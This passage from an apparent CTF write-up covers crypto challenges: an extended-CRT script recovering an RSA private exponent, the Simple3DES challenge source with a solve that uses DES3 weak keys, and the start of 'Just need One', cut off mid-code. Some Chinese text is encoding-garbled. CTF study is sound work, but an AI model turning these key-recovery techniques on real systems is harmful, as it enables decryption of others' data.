a2<span class=\"token punctuation\">,</span> m2 <span class=\"token operator\">=</span> x2</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">,</span> m2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token punctuation\">(</span>a2 <span class=\"token operator\">-</span> a1<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> d <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p1<span class=\"token punctuation\">,</span>p2 <span class=\"token operator\">=</span> m1 <span class=\"token operator\">//</span> d<span class=\"token punctuation\">,</span>m2 <span class=\"token operator\">//</span> d</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    _<span class=\"token punctuation\">,</span>l1<span class=\"token punctuation\">,</span>l2 <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>gcdext<span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">,</span>p2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    k <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>a1 <span class=\"token operator\">-</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> d<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> l1</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    lcm <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>lcm<span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">,</span>m2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    ans <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>a1 <span class=\"token operator\">+</span> k <span class=\"token operator\">*</span> m1<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> lcm</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">,</span>lcm</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">excrt</span><span class=\"token punctuation\">(</span>ai<span class=\"token punctuation\">,</span>mi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    tmp <span class=\"token operator\">=</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>ai<span class=\"token punctuation\">,</span>mi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">reduce</span><span class=\"token punctuation\">(</span>union<span class=\"token punctuation\">,</span> tmp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>mi <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>r <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>r <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>ai <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>dp<span class=\"token punctuation\">,</span>dq<span class=\"token punctuation\">,</span>dr<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>d<span class=\"token punctuation\">,</span>lcm <span class=\"token operator\">=</span> excrt<span class=\"token punctuation\">(</span>ai<span class=\"token punctuation\">,</span>mi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q <span class=\"token operator\">*</span> r</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"simple3des\"><a class=\"markdownIt-Anchor\" href=\"#simple3des\">#</a> Simple3DES</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> DES3</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>xor <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">:</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> b<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">max</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pad <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> msg<span class=\"token punctuation\">,</span>padlen<span class=\"token punctuation\">:</span> msg<span class=\"token operator\">+</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>padlen<span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>padlen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>padlen<span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>padlen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>flag <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>environ<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"FLAG\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"SYC&#123;Al3XEI_FAKE_FLAG&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sec <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>banner <span class=\"token operator\">=</span> <span class=\"token string\">'|'</span><span class=\"token operator\">*</span><span class=\"token number\">70</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>DEBUG <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">proof_of_work</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    proof <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">.</span>ascii_letters<span class=\"token operator\">+</span>string<span class=\"token punctuation\">.</span>digits<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    digest <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span>proof<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sha256(XXXX+%s) == %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>proof<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> digest<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    x <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Give me XXXX: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">4</span> <span class=\"token keyword\">or</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>proof<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> digest<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Right!\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">enc</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        key <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        msg <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        des <span class=\"token operator\">=</span> DES3<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span>DES3<span class=\"token punctuation\">.</span>MODE_ECB<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        ct <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>des<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>pad<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">return</span> bytes_to_long<span class=\"token punctuation\">(</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">return</span> Exception</pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">service</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    cnt <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> proof_of_work<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Simple DES Encryption Service'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">while</span> cnt<span class=\"token operator\">&lt;</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1. Encrypt\\n2. Get encrypted flag.'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        choice <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">if</span> choice <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Input msg:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            msg <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Input key:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            key <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token keyword\">elif</span> choice <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Input key:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>            key <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">(</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>            exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        cnt<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Bye!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    service<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token keyword\">except</span> Exception<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Something goes wrong...\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token operator\">+</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>ÂéªËæìÂÖ•Áõ∏ÂêåÁöÑ 0xFEFEFEFEFEFEFEFE1F1F1F1F0E0E0E0EFEFEFEFEFEFEFEFE ÂèòÊàê 2DES</p>\n<blockquote>\n<p>sha256(XXXX+bdc8ArQJbMwUCQh7) == cd4a27077eaea67b872c59b0232ae722e179992aa8b2c08624667301a9a516d7<br>\nGive me XXXX: KfXV<br>\nRight!<br>\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||<br>\nSimple DES Encryption Service<br>\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||</p>\n<ol>\n<li>Encrypt</li>\n<li>Get encrypted flag.</li>\n</ol>\n<blockquote>\n<p>2<br>\nInput key:<br>\n6252485650149870250738853120274631817958237138334041177854<br>\n5645108062031882523941457412438800103538695650524004750720</p>\n</blockquote>\n<ol>\n<li>Encrypt</li>\n<li>Get encrypted flag.</li>\n</ol>\n<blockquote>\n<p>1<br>\nInput msg:<br>\n5645108062031882523941457412438800103538695650524004750720<br>\nInput key:<br>\n6252485650149870250738853120274631817958237138334041177854<br>\n37699681561444816228091816433931698303804192466855953956737310357621942568417<br>\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||<br>\nBye!</p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token number\">37699681561444816228091816433931698303804192466855953956737310357621942568417</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"just-need-one\"><a class=\"markdownIt-Anchor\" href=\"#just-need-one\">#</a> Just need One</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> random </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> string </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> hashlib </pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>flag <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>environ<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"FLAG\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b\"SYC&#123;Al3XEI_FAKE_FLAG&#125;\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>DEBUG <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>banner <span class=\"token operator\">=</span> <span class=\"token string\">'|'</span><span class=\"token operator\">*</span><span class=\"token number\">70</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"==DEBUG MODE==\"</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">proof_of_work</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    proof <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">.</span>ascii_letters<span class=\"token operator\">+</span>string<span class=\"token punctuation\">.</span>digits<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    digest <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span>proof<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sha256(XXXX+%s) == %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>proof<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> digest<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    x <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Give me XXXX: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">4</span> <span class=\"token keyword\">or</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>proof<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> digest<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Right!\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>  </pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token 